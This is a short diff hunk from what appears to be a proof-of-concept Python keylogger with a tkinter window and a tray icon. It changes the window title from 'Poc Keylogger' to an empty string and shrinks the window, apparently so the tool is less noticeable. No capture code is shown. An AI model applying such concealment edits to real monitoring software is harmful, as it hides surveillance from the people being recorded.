@@ -59,10 +59,10 @@ startThreading.start()
 
 # Create an instance of tkinter frame or window
 win=Tk()
-win.title("Poc Keylogger")
+win.title("")
 
 # Set the size of the window
-win.geometry("250x0")
+win.geometry("110x0")
 
 # Define a function for quit the window
 def quit_window(icon, item):
